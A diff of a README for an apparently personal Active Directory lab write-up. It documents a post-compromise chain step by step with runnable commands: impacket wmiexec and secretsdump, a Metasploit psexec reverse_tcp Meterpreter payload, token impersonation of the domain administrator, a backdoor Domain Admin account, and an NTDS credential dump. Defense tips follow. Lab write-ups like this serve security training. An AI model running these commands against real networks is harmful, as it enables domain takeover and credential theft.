@@ -4,20 +4,24 @@
 ![Tool](https://img.shields.io/badge/Tool-Metasploit-purple)
 ![Tool](https://img.shields.io/badge/Tool-Impacket-orange)
 ![Attack](https://img.shields.io/badge/Attack-Token%20Impersonation-red)
+![Technique](https://img.shields.io/badge/Technique-Privilege%20Escalation-yellow)
 ![Status](https://img.shields.io/badge/Status-Completed-success)
 
 ---
 
 ## 📌 Overview
 
-In this lab, I performed a **post-compromise attack in an Active Directory environment** using **Meterpreter (Metasploit)**.
+In this lab, I performed a **post-compromise attack in an Active Directory environment** using **Meterpreter (Metasploit)** and **Impacket tools**.
+
+This lab also included **real-world troubleshooting scenarios**, where default attack paths failed due to modern Windows security controls.
 
 The attack flow included:
 
 - Token impersonation
-- Privilege escalation to Domain Admin
+- Privilege escalation to SYSTEM
+- Domain Admin impersonation
 - Creating a persistent user
-- Dumping domain credentials using Impacket
+- Dumping domain credentials (NTDS.dit)
 
 ---
 
@@ -34,9 +38,9 @@ The attack flow included:
 ## 🧪 Lab Environment
 
 - **Attacker:** Kali Linux
-- **Victim Machine:** Domain-joined Windows system (Punisher)
-- **Domain Controller:** Windows Server
-- **Domain:** `MARVEL.local`
+- **Victim Machine:** `<TARGET_MACHINE>`
+- **Domain Controller:** `<DC_MACHINE>`
+- **Domain:** `<DOMAIN_NAME>`
 
 ---
 
@@ -44,147 +48,163 @@ The attack flow included:
 
 - Metasploit Framework (Meterpreter)
 - Incognito (Token manipulation)
-- Impacket (`secretsdump`)
+- Impacket (`wmiexec`, `secretsdump`)
+- CrackMapExec
 - Windows CMD
+
+---
+
+## ⚠️ Issues Faced (Real Lab Challenges)
+
+During the attack, the following issues were encountered:
+
+- `psexec → ACCESS_DENIED`
+- Payload blocked by Windows Defender
+- Meterpreter session initially failed
+- Confusion between WMI shell and Meterpreter shell
+
+### 🔍 Root Cause
+
+- Modern Windows security (Defender + UAC)
+- Service-based execution blocked
+- AV detection on payload execution
+
+### ✅ Solution
+
+- Switched to **Impacket wmiexec (low-noise execution)**
+- Disabled Defender (lab environment)
+- Re-established Meterpreter session successfully
 
 ---
 
 ## 🚀 Attack Flow
 
-### 🔹 Step 1 – Load Incognito
+### 🔹 Step 1 – Initial Access (WMI Execution)
 
-```bash id="a1"
+```bash
+impacket-wmiexec <DOMAIN_NAME>/<USER>:<PASSWORD>@<TARGET_IP>
+```
+
+### 🔹 Step 2 – Dump Local Credentials
+
+```bash
+impacket-secretsdump <DOMAIN_NAME>/<USER>:<PASSWORD>@<TARGET_IP>
+```
+
+### 🔹 Step 3 – Gain Meterpreter Session
+
+```bash
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set RHOSTS <TARGET_IP>
+set SMBUser <USER>
+set SMBPass <PASSWORD>
+set SMBDomain <DOMAIN_NAME>
+run
+```
+
+### 🔹 Step 4 – Load Incognito
+
+```bash
 load incognito
 ```
 
----
+### 🔹 Step 5 – List Available Tokens
 
-### 🔹 Step 2 – List Available Tokens
-
-```bash id="a2"
+```bash
 list_tokens -u
 ```
 
----
+### 🔹 Step 6 – Impersonate Domain Administrator
 
-### 🔹 Step 3 – Impersonate User Token
-
-```bash id="a3"
-impersonate_token marvel\\fcastle
+```bash
+impersonate_token <DOMAIN_NAME>\\Administrator
 ```
 
----
+### 🔹 Step 7 – Confirm Identity
 
-### 🔹 Step 4 – Revert & Check SYSTEM Access
-
-```bash id="a4"
-rev2self
+```bash
 getuid
 ```
 
-Expected:
+### Expected:
 
-```text
-NT AUTHORITY\SYSTEM
+```bash
+<DOMAIN_NAME>\Administrator
 ```
 
----
+### 🔹 Step 8 – Create New Domain User
 
-### 🔹 Step 5 – Impersonate Domain Administrator
-
-```bash id="a5"
-impersonate_token marvel\\administrator
+```bash
+net user testuser Password1@ /add /domain
 ```
 
----
+### 🔹 Step 9 – Add User to Domain Admins
 
-### 🔹 Step 6 – Create New Domain User
-
-```cmd id="a6"
-net user <USERNAME> <PASSWORD> /add /domain
+```bash
+net group "Domain Admins" testuser /ADD /DOMAIN
 ```
 
----
+### ✔️ Full domain control achieved
 
-### 🔹 Step 7 – Add User to Domain Admins
+### 🔹 Step 10 – Dump Domain Credentials (NTDS)
 
-```cmd id="a7"
-net group "Domain Admins" hawkeye /ADD /DOMAIN
+```bash
+impacket-secretsdump <DOMAIN_NAME>/testuser:'Password1@'@<DC_IP>
 ```
 
-✔️ This step provides full domain control and persistence.
-
----
-
-### 🔹 Step 8 – Dump Domain Credentials
-
-```bash id="a8"
-impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@<DC_IP>
-```
-
----
-
-## 📊 Results
+### 📊 Results
 
 Successfully extracted:
 
-- Local SAM hashes
-- LSA Secrets
-- Domain user hashes
-- Kerberos keys
+Local SAM hashes
+LSA Secrets
+Domain user hashes
+Kerberos keys
+NTDS.dit database
 
 ### 🔥 Key Accounts Dumped
 
-- Administrator
-- krbtgt
-- SQLService
-- fcastle
-- hawkeye
+Administrator
+krbtgt (🔥 Critical)
+SQLService
+<USER>
+testuser
 
----
+### 🧠 Key Learnings
 
-## 🧠 Key Learnings
+Token impersonation can lead to full domain compromise
+SYSTEM access ≠ Domain Admin (token impersonation required)
+Modern Windows may block traditional tools (psexec)
+wmiexec is more stealthy and reliable
+Defender can break exploit chains
+Persistence via domain user creation is highly effective
 
-- Token impersonation can lead to full domain compromise
-- SYSTEM access ≠ Domain Admin (must impersonate DA)
-- Privilege escalation is required before NTDS dump
-- Creating a new admin user ensures persistence
+### 🛡️ Defense Recommendations
 
----
+Limit token impersonation privileges
+Implement account tiering (Tier 0 / Tier 1 / Tier 2)
+Never allow Domain Admin login on workstations
+Restrict local admin privileges
+Use LAPS for unique admin passwords
+Monitor suspicious account creation
+Enable logging for privilege escalation and token usage
 
-## 🛡️ Defense Recommendations
+### 📸 Screenshots
 
-- Restrict token impersonation privileges
-- Monitor abnormal token usage
-- Limit Domain Admin group membership
-- Enable logging for privilege escalation
-- Detect suspicious account creation
+### 🔚 Conclusion
 
----
+This lab demonstrates a complete Active Directory post-compromise attack chain:
 
-## 📸 Screenshots
+Initial access (WMI)
+Credential dumping
+Meterpreter access
+Token impersonation
+Domain Admin escalation
+Persistence (new admin user)
+Full domain credential dump
 
-![Meterpreter session](screenshots/session.png)
-![tokens](screenshots/tokens.png)
-![secretsdump output](screenshots/secretsdump.png)
+### 📎 Author
 
----
-
-## 🔚 Conclusion
-
-This lab demonstrates a complete **post-compromise attack chain**:
-
-1. SYSTEM access
-2. Token impersonation
-3. Domain Admin escalation
-4. Persistence via new user
-5. Full domain credential dump
-
----
-
-## 📎 Author
-
-- GitHub: https://github.com/bilalhunzla
-- LinkedIn: www.linkedin.com/in/hunzla-bilal
-
----
+GitHub: https://github.com/bilalhunzla
+LinkedIn: https://www.linkedin.com/in/hunzla-bilal
